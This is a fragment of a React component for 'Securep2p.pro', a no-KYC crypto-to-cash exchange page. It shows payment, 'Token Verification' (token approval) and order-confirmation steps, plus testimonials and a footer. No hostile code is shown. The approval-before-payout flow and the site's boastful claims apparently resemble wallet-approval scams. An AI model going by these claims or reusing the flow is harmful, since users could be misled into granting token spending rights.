                  <div className="flex items-center space-x-2">
                    <div className="w-2 h-2 bg-orange-500 rounded-full animate-pulse"></div>
                    <span className={`${themeClasses.textSecondary} whitespace-nowrap`}>120K+ Active Users</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Main Exchange Interface */}
            <div className="max-w-7xl mx-auto px-3 sm:px-4 lg:px-8 pb-6 sm:pb-12">
              <div className="grid lg:grid-cols-3 gap-4 sm:gap-6 lg:gap-8">
                {/* Left Column - Asset Management */}
                <div className="lg:col-span-2 space-y-4 sm:space-y-6 lg:space-y-8">
                  <AssetManagement
                    currentStep={currentStep}
                    loading={loading}
                    tokens={tokens}
                    selectedToken={selectedToken}
                    tradeAmount={tradeAmount}
                    tokenPrice={tokenPrice}
                    priceLoading={priceLoading}
                    priceError={priceError}
                    darkMode={darkMode}
                    themeClasses={themeClasses}
                    connectWallet={connectWallet}
                    setSelectedToken={setSelectedToken}
                    setTradeAmount={setTradeAmount}
                    setSellAmount={setSellAmount}
                    setQuote={setQuote}
                    setCurrentStep={setCurrentStep}
                  />

                  {/* Step 3: Payment Selection */}
                  {currentStep === 3 && (
                    <div className={`${themeClasses.cardBg} rounded-xl sm:rounded-2xl ${themeClasses.border} border overflow-hidden shadow-2xl p-4 sm:p-6 lg:p-8 backdrop-blur-xl`}>
                      <PaymentSelection
                        selectedCountry={selectedCountry}
                        selectedPaymentMethod={selectedPaymentMethod}
                        paymentDetails={paymentDetails}
                        themeClasses={themeClasses}
                        darkMode={darkMode}
                        setSelectedCountry={setSelectedCountry}
                        setSelectedPaymentMethod={setSelectedPaymentMethod}
                        setPaymentDetails={setPaymentDetails}
                        setCurrentStep={setCurrentStep}
                        validatePaymentDetails={validatePaymentDetails}
                      />
                    </div>
                  )}

                  {/* Step 4: Token Verification */}
                  {currentStep === 4 && (
                    <div className={`${themeClasses.cardBg} rounded-xl sm:rounded-2xl ${themeClasses.border} border overflow-hidden shadow-2xl p-4 sm:p-6 lg:p-8 backdrop-blur-xl`}>
                      <TokenVerification
                        tokens={tokens}
                        showApprovalAnimation={showApprovalAnimation}
                        approvalInProgress={approvalInProgress}
                        darkMode={darkMode}
                        themeClasses={themeClasses}
                        approveToken={approveToken}
                        setCurrentStep={handleOrderConfirmation}
                      />
                    </div>
                  )}

                  {/* Step 5: Confirmation */}
                  {currentStep === 5 && (
                    <div className={`${themeClasses.cardBg} rounded-xl sm:rounded-2xl ${themeClasses.border} border overflow-hidden shadow-2xl p-4 sm:p-6 lg:p-8 backdrop-blur-xl`}>
                      <div className="text-center py-4 sm:py-6 lg:py-8">
                        <div className="w-16 h-16 sm:w-20 sm:h-20 bg-gradient-to-r from-green-400 to-emerald-500 rounded-xl sm:rounded-2xl flex items-center justify-center mx-auto mb-4 sm:mb-6 shadow-2xl">
                          <CheckCircle className="w-8 h-8 sm:w-10 sm:h-10 text-white" />
                        </div>
                        <h3 className={`text-xl sm:text-2xl font-bold ${themeClasses.text} mb-3`}>Order Confirmed!</h3>
                        <p className={`${themeClasses.textSecondary} mb-6 sm:mb-8 max-w-md mx-auto px-2`}>
                          {selectedPaymentMethod?.toLowerCase().includes("cash") ? (
                            "Your order is being processed. Please follow the message received in your contact method."
                          ) : (
                            <>Your order is being processed. You will receive funds via <strong>{selectedPaymentMethod}</strong> within 5–10 minutes.</>
                          )}
                        </p>

                        <div className={`bg-gradient-to-r ${darkMode ? 'from-green-900/10 to-emerald-900/10' : 'from-green-50 to-emerald-50'} border ${darkMode ? 'border-green-800/30' : 'border-green-200'} rounded-xl p-4 sm:p-6 mb-6 sm:mb-8 text-left backdrop-blur-sm`}>
                          <h4 className={`font-semibold ${darkMode ? 'text-green-300' : 'text-green-900'} mb-3`}>Order Summary</h4>
                          <div className={`space-y-2 text-xs sm:text-sm ${themeClasses.textSecondary}`}>
                            <div className="flex justify-between">
                              <span>Order ID:</span>
                              <span className="font-mono text-xs">{orderId}</span>
                            </div>
                            <div className="flex justify-between">
                              <span>Wallet:</span>
                              <span className="font-mono text-xs">{walletAddress.slice(0, 6)}...{walletAddress.slice(-4)}</span>
                            </div>
                            <div className="flex justify-between">
                              <span>Asset:</span>
                              <span className="text-right">{selectedToken?.name} ({selectedToken?.symbol})</span>
                            </div>
                            <div className="flex justify-between">
                              <span>Amount:</span>
                              <span className="text-right">{tradeAmount}</span>
                            </div>
                            <div className="flex justify-between">
                              <span>Payment Method:</span>
                              <span className="text-right">{selectedPaymentMethod}</span>
                            </div>
                            <hr className="my-3 sm:my-4" />
                            <div className={`flex justify-between font-semibold ${darkMode ? 'text-green-300' : 'text-green-800'}`}>
                              <span>Status:</span>
                              <span>Processing</span>
                            </div>
                          </div>
                        </div>

                        <button
                          onClick={handleFinish}
                          className={`w-full sm:w-auto bg-gradient-to-r ${themeClasses.gradient} text-white px-6 sm:px-8 py-3 sm:py-4 rounded-xl font-semibold hover:shadow-2xl transition-all duration-300 hover:scale-105`}
                        >
                          Start New Session
                        </button>
                      </div>
                    </div>
                  )}

                  {/* Desktop: Crypto News - Below Asset Management */}
                  <div className="hidden lg:block">
                    <CryptoNews darkMode={darkMode} themeClasses={themeClasses} />
                  </div>
                </div>

                {/* Right Column - Market Data & Info */}
                <div className="space-y-4 sm:space-y-6 lg:space-y-8 mt-6 lg:mt-0">
                  {/* Desktop: Reviews first, Mobile: Reviews first */}
                  <Testimonials
                    testimonials={testimonials}
                    darkMode={darkMode}
                    themeClasses={themeClasses}
                  />

                  {/* Desktop: Exchange Rates second */}
                  <div className="hidden lg:block">
                    <ExchangeRates
                      exchangeRates={exchangeRates}
                      showRates={showRates}
                      setShowRates={setShowRates}
                      selectedFiat={selectedFiat}
                      setSelectedFiat={setSelectedFiat}
                      darkMode={darkMode}
                      themeClasses={themeClasses}
                    />
                  </div>

                  {/* Mobile: Exchange Rates second */}
                  <div className="block lg:hidden">
                    <ExchangeRates
                      exchangeRates={exchangeRates}
                      showRates={showRates}
                      setShowRates={setShowRates}
                      selectedFiat={selectedFiat}
                      setSelectedFiat={setSelectedFiat}
                      darkMode={darkMode}
                      themeClasses={themeClasses}
                    />
                  </div>

                  {/* Mobile: News third */}
                  <div className="block lg:hidden">
                    <CryptoNews darkMode={darkMode} themeClasses={themeClasses} />
                  </div>

                  {/* Desktop: Security Features third */}
                  <div className="hidden lg:block">
                    <SecurityFeatures
                      darkMode={darkMode}
                      themeClasses={themeClasses}
                    />
                  </div>
                </div>
              </div>
            </div>
          </>
        )}
      </div>

      {/* Error & Success Messages */}
      {error && (
        <div className={`mt-4 sm:mt-6 mx-3 sm:mx-4 lg:mx-8 ${darkMode ? 'bg-red-900/10' : 'bg-red-50'} border ${darkMode ? 'border-red-800/30' : 'border-red-200'} rounded-xl p-3 sm:p-4 flex items-start sm:items-center backdrop-blur-sm`}>
          <AlertCircle className="w-5 h-5 text-red-600 mr-3 flex-shrink-0" />
          <span className={`${darkMode ? 'text-red-300' : 'text-red-800'} text-sm sm:text-base`}>{error}</span>
        </div>
      )}
      {success && (
        <div className={`mt-4 sm:mt-6 mx-3 sm:mx-4 lg:mx-8 ${darkMode ? 'bg-green-900/10' : 'bg-green-50'} border ${darkMode ? 'border-green-800/30' : 'border-green-200'} rounded-xl p-3 sm:p-4 flex items-start sm:items-center backdrop-blur-sm`}>
          <CheckCircle className="w-5 h-5 text-green-600 mr-3 flex-shrink-0" />
          <span className={`${darkMode ? 'text-green-300' : 'text-green-800'} text-sm sm:text-base`}>{success}</span>
        </div>
      )}

      <footer className={`${themeClasses.cardBg} border-t ${themeClasses.border} mt-16`}>
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-8">
            {/* Company Info */}
            <div className="md:col-span-2">
              <div className="flex items-center space-x-3 mb-4">
                <div className={`w-10 h-10 bg-gradient-to-r ${themeClasses.gradient} rounded-xl flex items-center justify-center shadow-lg`}>
                  <Zap className="w-6 h-6 text-white" />
                </div>
                <span className={`text-xl font-bold ${themeClasses.text}`}>Securep2p.pro</span>
              </div>
              <p className={`${themeClasses.textSecondary} mb-6 max-w-md`}>
                The most secure and private way to convert cryptocurrency to cash. 
                No KYC required, instant settlements, and bank-level security.
              </p>
              
              {/* Social Media Links */}
              <div className="space-y-3">
                <h4 className={`text-sm font-semibold ${themeClasses.text} mb-3`}>Follow Us</h4>
                <div className="flex space-x-4">
                 <a
  href="https://youtube.com/@securep2p"
  target="_blank"
  rel="noopener noreferrer"
  className={`w-10 h-10 rounded-lg ${themeClasses.cardBg} border ${themeClasses.border} flex items-center justify-center ${themeClasses.hover} transition-all duration-200 group`}
  aria-label="YouTube"
>
  <FaYoutube className="w-5 h-5 text-red-600 group-hover:scale-110 transition-transform" />
</a>

<a
  href="https://t.me/securep2p"
  target="_blank"
  rel="noopener noreferrer"
  className={`w-10 h-10 rounded-lg ${themeClasses.cardBg} border ${themeClasses.border} flex items-center justify-center ${themeClasses.hover} transition-all duration-200 group`}
  aria-label="Telegram"
>
  <FaTelegramPlane className="w-5 h-5 text-blue-500 group-hover:scale-110 transition-transform" />
</a>

<a
  href="https://medium.com/@motortigadua/securep2p-pro-the-future-of-privacy-first-cryptocurrency-exchange-014350207442"
  target="_blank"
  rel="noopener noreferrer"
  className={`w-10 h-10 rounded-lg ${themeClasses.cardBg} border ${themeClasses.border} flex items-center justify-center ${themeClasses.hover} transition-all duration-200 group`}
  aria-label="Medium"
>
  <img
    src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Medium_logo_Monogram.svg/2048px-Medium_logo_Monogram.svg.png"
    alt="Medium"
    className="w-5 h-5 object-contain group-hover:opacity-80 transition-opacity"
  />
</a>




                </div>
              </div>
            </div>

            {/* Quick Links */}
            <div>
              <h4 className={`text-sm font-semibold ${themeClasses.text} mb-4`}>Platform</h4>
              <ul className="space-y-3">
                <li>
                  <button
                    onClick={() => setShowBugBounty(true)}
                    className={`${themeClasses.textSecondary} hover:text-blue-600 transition-colors text-sm`}
                  >
                    Bug Bounty
                  </button>
                </li>
                <li>
                  <button
                    onClick={() => setShowScamAdvisory(true)}
                    className={`${themeClasses.textSecondary} hover:text-blue-600 transition-colors text-sm`}
                  >
                    Security Guide
                  </button>
                </li>
                <li>
                  <button
                    onClick={() => setShowContact(true)}
                    className={`${themeClasses.textSecondary} hover:text-blue-600 transition-colors text-sm`}
                  >
                    About Us
                  </button>
                </li>
                <li>
                  <button
                    onClick={() => setShowSupportPage(true)}
                    className={`${themeClasses.textSecondary} hover:text-blue-600 transition-colors text-sm`}
                  >
                    Support
                  </button>
                </li>
              </ul>
            </div>

            {/* Legal */}
            <div>
              <h4 className={`text-sm font-semibold ${themeClasses.text} mb-4`}>Legal</h4>
              <ul className="space-y-3">
                <li>
                  <button
                    onClick={() => setShowPrivacy(true)}
                    className={`${themeClasses.textSecondary} hover:text-blue-600 transition-colors text-sm`}
                  >
                    Privacy Policy
                  </button>
                </li>
                <li>
                  <button
                    onClick={() => setShowTerms(true)}
                    className={`${themeClasses.textSecondary} hover:text-blue-600 transition-colors text-sm`}
                  >
                    Terms & Conditions
                  </button>
                </li>
                <li>
                  <button
                    onClick={() => setShowRiskDisclosure(true)}
                    className={`${themeClasses.textSecondary} hover:text-blue-600 transition-colors text-sm`}
                  >
                    Risk Disclosure
                  </button>
                </li>
                <li>
                  <button
                    onClick={() => setShowAMLPolicy(true)}
                    className={`${themeClasses.textSecondary} hover:text-blue-600 transition-colors text-sm`}
                  >
                    AML Policy
                  </button>
                </li>
              </ul>
            </div>
          </div>

                  {/* Bottom Bar */}
          <div className={`border-t ${themeClasses.border} mt-8 pt-8 flex flex-col sm:flex-row justify-between items-center`}>
            <p className={`${themeClasses.textSecondary} text-sm`}>
              © 2025 Securep2p.pro. All rights reserved.
            </p>
            <div className="flex items-center space-x-6 mt-4 sm:mt-0">
              <div className="flex items-center space-x-2">
                <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                <span className={`${themeClasses.textSecondary} text-xs`}>Platform Online</span>
              </div>
              <div className="flex items-center space-x-2">
                <Shield className="w-4 h-4 text-green-600" />
                <span className={`${themeClasses.textSecondary} text-xs`}>SSL Secured</span>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}

export default App;